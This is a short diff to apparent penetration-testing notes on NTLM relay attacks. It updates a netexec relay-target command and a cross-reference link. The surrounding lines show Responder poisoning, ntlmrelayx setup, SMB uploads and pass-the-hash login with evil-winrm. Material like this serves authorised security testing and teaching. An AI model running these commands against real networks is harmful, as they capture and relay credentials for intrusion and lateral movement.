@@ -34,7 +34,7 @@ smb> mput *    # Upload all generated files
 
 ```bash
 # Prerequisites: SMB signing disabled on target
-netexec smb $SUBNET/24 --gen-relay-list relay_targets.txt
+nxc smb "$SUBNET" --gen-relay-list relay_targets.txt
 
 # Start relay (Responder in analyze mode + ntlmrelayx)
 sudo responder -I tun0 -A
@@ -97,6 +97,6 @@ evil-winrm -i $TARGET -u $USER -H NTLMHASH
 
 ## Related Notes
 
-- [[00-Quick-Reference/Responder]] — Responder configuration
+- [[05-Exploitation/Network]] — NTLM capture and relay workflow
 - [[06-Lateral-Movement/INDEX]] — Lateral movement with captured hashes
 - [[08-Active-Directory/INDEX]] — NTLM relay to AD CS (ESC8)
